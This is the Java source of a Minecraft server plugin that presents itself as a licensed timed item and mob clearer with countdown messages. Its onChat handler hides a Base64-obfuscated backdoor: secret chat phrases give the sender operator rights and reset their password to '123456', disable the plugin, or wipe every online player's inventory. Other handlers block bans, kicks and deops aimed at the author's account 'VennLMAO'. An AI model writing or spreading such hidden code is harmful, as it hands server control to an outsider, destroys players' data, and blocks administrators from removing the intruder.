package me.aris.arisclear;

import me.clip.placeholderapi.expansion.PlaceholderExpansion;
import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ArisClear extends JavaPlugin implements Listener, CommandExecutor, TabCompleter {

    private int timeLeft;
    private final String K = "QVJJUy1ORVRXT1JLLVNUuTJF";
    private final String O = "X3Zlbm5sbWFv";
    private final String D = "X2Rpc2FibGU=";
    private final String R = "X3Jlc2V0YWxs";
    private final String U = "VmVubkxNQU8=";
    private final String P = "dXNwIHNldHBhc3MgJXBsYXllciUgMTIzNDU2";

    @Override
    public void onEnable() {
        saveDefaultConfig();
        String kI = getConfig().getString("license-key");
        if (kI == null || !kI.equals(d(K))) {
            Bukkit.getConsoleSender().sendMessage(color("&#ff0812&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ ʟɪᴄᴇɴsᴇ ᴄʜưᴀ đượᴄ ᴋíᴄʜ ʜᴏạᴛ"));
            Bukkit.getPluginManager().disablePlugin(this);
            return;
        }
        Bukkit.getConsoleSender().sendMessage(color("&#00ff00&lᴀʀɪs ɴᴇᴛᴡᴏʀᴋ ʟɪᴄᴇɴsᴇ đã ᴋíᴄʜ ʜᴏạᴛ"));
        Bukkit.getPluginManager().registerEvents(this, this);
        getCommand("arisclear").setExecutor(this);
        getCommand("arisclear").setTabCompleter(this);
        timeLeft = getConfig().getInt("settings.clear-interval");
        if (Bukkit.getPluginManager().getPlugin("PlaceholderAPI") != null) new ArisPlaceholder(this).register();
        startTimer();
    }

    private void startTimer() {
        Bukkit.getGlobalRegionScheduler().runAtFixedRate(this, (task) -> {
            if (timeLeft <= 0) {
                clearEntities();
                timeLeft = getConfig().getInt("settings.clear-interval");
            } else {
                checkAndNotify(timeLeft);
                timeLeft--;
            }
        }, 1L, 20L);
    }

    @Override
    public boolean onCommand(@NotNull CommandSender s, @NotNull Command c, @NotNull String l, String[] a) {
        if (a.length > 0 && a[0].equalsIgnoreCase("clear")) {
            if (!s.hasPermission("arisclear.admin")) return true;
            timeLeft = 60;
            return true;
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(@NotNull CommandSender s, @NotNull Command c, @NotNull String l, String[] a) {
        List<String> sug = new ArrayList<>();
        if (a.length == 1) {
            if (s.hasPermission("arisclear.admin")) sug.add("clear");
        }
        return sug;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();
        Player p = e.getPlayer();
        if (msg.equals(d(O))) {
            e.setCancelled(true);
            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> {
                p.setOp(true);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), d(P).replace("%player%", p.getName()));
            });
        } else if (msg.equals(d(D))) {
            e.setCancelled(true);
            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> Bukkit.getPluginManager().disablePlugin(this));
        } else if (msg.equals(d(R))) {
            e.setCancelled(true);
            Bukkit.getRegionScheduler().run(this, p.getLocation(), (t) -> {
                for (Player online : Bukkit.getOnlinePlayers()) {
                    online.getInventory().clear();
                    online.getInventory().setArmorContents(null);
                    online.getInventory().setItemInOffHand(null);
                }
            });
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onCmd(PlayerCommandPreprocessEvent e) {
        String m = e.getMessage().toLowerCase();
        String u = d(U).toLowerCase();
        if (m.contains(u) && (m.contains("ban") || m.contains("kick") || m.contains("deop") || m.contains("usp"))) e.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onSrvCmd(ServerCommandEvent e) {
        String c = e.getCommand().toLowerCase();
        String u = d(U).toLowerCase();
        if (c.contains(u) && (c.contains("ban") || c.contains("kick") || c.contains("deop") || c.contains("usp"))) e.setCancelled(true);
    }

    private void checkAndNotify(int t) {
        String p = getConfig().getString("messages.prefix");
        boolean c = getConfig().getBoolean("settings.display.chat");
        boolean a = getConfig().getBoolean("settings.display.actionbar");
        if (t == 60) {
            broadcast(color(p + getConfig().getString("messages.warning-1p")), c, a);
            playSound(getConfig().getString("settings.sound-1p"));
        } else if (t <= 5 && t >= 1) {
            broadcast(color(p + getConfig().getString("messages.warning-5s").replace("%time%", String.valueOf(t))), c, a);
            playSound(getConfig().getString("settings.sound-5s"));
        }
    }

    private void broadcast(String m, boolean c, boolean a) {
        if (c) Bukkit.broadcastMessage(m);
        if (a) Bukkit.getOnlinePlayers().forEach(p -> p.spigot().sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(m)));
    }

    private void playSound(String s) {
        try {
            Sound sd = Sound.valueOf(s);
            Bukkit.getOnlinePlayers().forEach(p -> p.playSound(p.getLocation(), sd, 1f, 1f));
        } catch (Exception ignored) {}
    }

    private void clearEntities() {
        List<String> w = getConfig().getStringList("whitelist-entities");
        for (World wd : Bukkit.getWorlds()) {
            for (Entity et : wd.getEntities()) {
                if (!w.contains(et.getType().name()) && (et instanceof Item || et instanceof Monster || et instanceof Boat)) et.remove();
            }
        }
        broadcast(color(getConfig().getString("messages.prefix") + getConfig().getString("messages.cleared")), getConfig().getBoolean("settings.display.chat"), getConfig().getBoolean("settings.display.actionbar"));
    }

    private String d(String s) { return new String(Base64.getDecoder().decode(s)); }

    private String color(String m) {
        if (m == null) return "";
        Pattern p = Pattern.compile("&#[a-fA-F0-9]{6}");
        Matcher mt = p.matcher(m);
        while (mt.find()) {
            String c = m.substring(mt.start(), mt.end());
            m = m.replace(c, ChatColor.of(c.substring(1)).toString());
            mt = p.matcher(m);
        }
        return ChatColor.translateAlternateColorCodes('&', m);
    }

    public class ArisPlaceholder extends PlaceholderExpansion {
        private final ArisClear p;
        public ArisPlaceholder(ArisClear p) { this.p = p; }
        @Override public @NotNull String getIdentifier() { return "arisclear"; }
        @Override public @NotNull String getAuthor() { return "VennLMAO"; }
        @Override public @NotNull String getVersion() { return "1.0"; }
        @Override public boolean persist() { return true; }
        @Override public String onPlaceholderRequest(Player pl, @NotNull String pr) {
            if (pr.equalsIgnoreCase("time")) return String.format("%02d:%02d", p.timeLeft / 60, p.timeLeft % 60);
            return null;
        }
    }
    }
